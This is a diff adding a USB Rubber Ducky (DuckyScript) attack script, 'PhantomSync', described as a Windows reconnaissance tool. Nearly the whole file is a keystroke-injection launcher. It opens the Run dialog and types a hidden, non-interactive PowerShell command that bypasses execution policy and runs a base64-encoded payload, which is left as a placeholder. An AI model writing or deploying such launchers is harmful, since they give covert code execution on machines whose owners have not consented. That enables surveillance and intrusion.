@@ -1,0 +1,18 @@
+REM Title: PhantomSync
+REM Author: <your_handle>
+REM Description: Menu-driven Windows system profiling. Writes a timestamped
+REM              report to the Ducky mass-storage partition.
+REM Target: Windows 10/11
+REM Version: 2.0
+REM Category: recon
+
+REM ---------- CONFIGURATION ----------
+DEFINE #DELAY_BOOT 1200
+DEFINE #DELAY_RUN  600
+
+REM ---------- LAUNCH POWERSHELL WITH ENCODED PAYLOAD ----------
+DELAY #DELAY_BOOT
+GUI r
+DELAY #DELAY_RUN
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <BASE64_BLOB>
+ENTER
